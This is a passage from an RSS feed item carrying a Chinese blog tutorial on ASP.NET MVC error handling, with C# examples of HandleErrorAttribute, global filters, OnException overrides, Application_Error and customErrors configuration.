&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FilterConfig
{
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; RegisterGlobalFilters(GlobalFilterCollection filters)
        {
            filters.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; HandleErrorAttribute 
            {
                ExceptionType &lt;/span&gt;= &lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(KeyNotFoundException),
                View &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;KeyNotFound&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                Order &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;
            });
            filters.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; HandleErrorAttribute(),&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
        }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;将自定义错误过滤器设置为全局过滤器：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;App_Start文件夹下FilterConfig.cs文件中&lt;/p&gt;
&lt;p&gt;&lt;span&gt;例：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FilterConfig
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; RegisterGlobalFilters(GlobalFilterCollection filters)
        {
            
             &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;其他过滤器&lt;/span&gt;
&lt;span&gt;
             filters.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; CustomHandleError());
         }
     }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;2.2重写控制器&lt;/strong&gt;&lt;strong&gt;OnException&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;方法&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;注意将错误设置为已处理，不然错误继续抛出，但如果设置了全局错误过滤器，那么即使不标记为已处理，也不要紧，因为错误最终会被全局过滤器捕获并处理。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;例：&lt;/span&gt; &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HomeController : Controller
 {

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;其他控制器操作&lt;/span&gt;

        &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnException(ExceptionContext filterContext)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (filterContext==&lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;base&lt;/span&gt;&lt;span&gt;.OnException(filterContext);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;记录日志&lt;/span&gt;
&lt;span&gt;            LogError(filterContext.Exception);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断是否启用了自定义错误&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (filterContext.HttpContext.IsCustomErrorEnabled)
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将错误设置为已处理&lt;/span&gt;
                filterContext.ExceptionHandled = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;显示错误页&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.View(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Error&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;).ExecuteResult(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.ControllerContext);
            }
        }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;或者创建控制器基类&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; BaseController : Controller
    {
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnException(ExceptionContext filterContext)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;错误日志记录&lt;/span&gt;
&lt;span&gt;        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;全局错误处理&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;针对模型绑定或路由等过程中抛出的异常我们只能使用全局错误处理策略。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.1 Global.asax中添加处理异常的代码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MvcApplication : System.Web.HttpApplication
    {
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Application_Start()
        {
            AreaRegistration.RegisterAllAreas();
            FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);
            RouteConfig.RegisterRoutes(RouteTable.Routes);
            BundleConfig.RegisterBundles(BundleTable.Bundles);
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Application_Error(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, EventArgs e)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; exception =&lt;span&gt; Server.GetLastError();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (exception == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;异常发生记录日志或发送邮件

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;清除异常&lt;/span&gt;
&lt;span&gt;            Server.ClearError();

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;重定向&lt;/span&gt;
            Response.Redirect(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;home/index&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;3.2捕获未匹配的路由&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在路由注册列表最底端注册路由。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; RouteConfig
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; RegisterRoutes(RouteCollection routes)
        {
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;其他配置&lt;/span&gt;
&lt;span&gt;           routes.MapRoute(
                name: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MatchAll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                url: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{*anyurl}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                defaults: &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; { controller = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Error&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,action =&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Missing&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; }
                );
         }
     }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;定义&lt;/span&gt;Error控制器及Missing&lt;span&gt;操作&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ErrorController : Controller
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; GET: Error&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; ActionResult Missing()
        {
            HttpContext.Response.StatusCode &lt;/span&gt;= &lt;span&gt;404&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;禁用IIS7默认的错误页，这样才能展示我们指定都的视图&lt;/span&gt;
            HttpContext.Response.TrySkipIisCustomErrors = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;也可以在此处记录日志信息

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;要展示的信息&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; model =&lt;span&gt; ......
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; View(model);
        }
     }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;需要注意的是，这种方式不一定能处理所有未匹配的情形。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;例如：&lt;/span&gt;http://localhost/mvcpointapp/home/index1，这个url请求说我home是存在，但是index1操作不存在，上面配置MatchAll&lt;span&gt;路由无法匹配这个&lt;/span&gt;url。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;可以匹配的情形如：&lt;/span&gt;http://localhost/mvcpointapp/v1/home/index/1，这个url能被上面配置的MatchAll&lt;span&gt;路由匹配，所以可以显示&lt;/span&gt;Missing&lt;span&gt;视图。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4实践&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.1使用HandleErrorAttribute注意要对&amp;lt;system.web&amp;gt;的&amp;lt;customErrors&amp;gt;节进行设置 。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;例如：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;控制器为&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HomeController : Controller
    {
        [HandleError(ExceptionType &lt;/span&gt;= &lt;span&gt;typeof&lt;/span&gt;(KeyNotFoundException), View = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Error&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ActionResult Index()
        {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; KeyNotFoundException();
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; View();
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;其他控制操作&lt;/span&gt;
&lt;span&gt;
      }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&amp;lt;system.web&amp;gt;的&amp;lt;customErrors&amp;gt;节&lt;/p&gt;
&lt;p&gt;&amp;lt;customErrors mode=&quot;On&quot; defaultRedirect=&quot;Error/Error2&quot;&amp;gt;&amp;lt;/customErrors&amp;gt;&lt;/p&gt;
&lt;p&gt;Error.cshtml文件位于Views文件夹下的子文件夹Shared文件夹下&lt;/p&gt;
&lt;p&gt;&lt;span&gt;浏览器中输入：&lt;/span&gt;http://localhost/mvcpointapp/&lt;/p&gt;
&lt;p&gt;&lt;span&gt;结果可以正常显示&lt;/span&gt;Error.cshtml页面,同时注意到虽然在customErrors &lt;span&gt;配置节中指定了&lt;/span&gt;defaultRedirect&lt;span&gt;，但还是跳转到&lt;/span&gt;Error.cshtml页面。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;将&lt;/span&gt;&amp;lt;customErrors&amp;gt;的mode&lt;span&gt;设置为&lt;/span&gt;Off,则显示经典错误页。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.2 Application_Error&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;代码如&lt;/span&gt;3.1节所示，控制器如4.1所示，&amp;lt;system.web&amp;gt;的&amp;lt;customErrors&amp;gt;节为&amp;lt;customErrors mode=&quot;On&quot; defaultRedirect=&quot;Error/Error2&quot;&amp;gt;&amp;lt;/customErrors&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;输入：&lt;/span&gt;http://localhost/mvcpointapp/home/index，断点调试，发现错误被HandleError&lt;span&gt;拦截，&lt;/span&gt;Global.asax的Application_Error方法没有执行。而当输入：http://localhost/mvcpointapp/home/indexr，Application_Error执行了。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;关闭&lt;/span&gt;&amp;lt;customErrors&amp;gt;配置节，而不注掉控制器上的HandleErrorAttribute特性，输入：http://localhost/mvcpointapp/home/index，发现Application_Error执行了。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;通过上述实践，充分证明&lt;/span&gt;HandleErrorAttribute会拦截控制器内抛出的异常，而无法拦截无法找到资源这种异常。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.3策略&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;一种常用的拦截错误信息、记录错误日志与显示自定义错误页的策略为：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1）&lt;span&gt;首先配置&lt;/span&gt;&amp;lt;system.web&amp;gt;的&amp;lt;customErrors&amp;gt;节，注意务必设置defaultRedirect&lt;span&gt;；并且定义错误控制器及相应的操作和视图。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2）&lt;span&gt;定义基类控制器或自定义错误过滤器，记录异常。对于自定义错误过滤器的情形一般将其注册为全局过滤器。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;3）&lt;span&gt;在&lt;/span&gt;Global.asax中添加Application_Error方法拦截意想不到的异常并记录异常。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;参考：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.Jess Chadwick/Todd Snyder/Hrusikesh Panda，徐雷/徐扬&lt;/p&gt;
&lt;p&gt;译。ASP.NET MVC4 Web编程&lt;/p&gt;
&lt;p&gt;2.Jon Galloway/Phil Haack/Brad Wilson/K. Scott Allen，孙远帅/邹权译  ASP.NET MVC4 高级编程（第四版）&lt;/p&gt;
&lt;p&gt;3.黄保翕，ASP.NET MVC4开发指南&lt;/p&gt;
&lt;p&gt;4.蒋金楠，ASP.NET MVC4框架揭秘&lt;/p&gt;
&lt;p&gt;5.https://www.asp.net/mvc&lt;/p&gt;
&lt;p&gt;6.Dino Esposito著，潘丽臣译，ASP.NET MVC5编程实战&lt;/p&gt;

&lt;p&gt;-----------------------------------------------------------------------------------------&lt;/p&gt;
&lt;p&gt;转载与引用请注明出处。&lt;/p&gt;
&lt;p&gt;时间仓促，水平有限，如有不当之处，欢迎指正。&lt;/p&gt;
</description>
<pubDate>Mon, 26 Mar 2018 05:05:00 +0000</pubDate>
<dc:creator>甜橙很酸</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/hdwgxz/p/8650244.html</dc:identifier>
</item>
</channel>
</rss>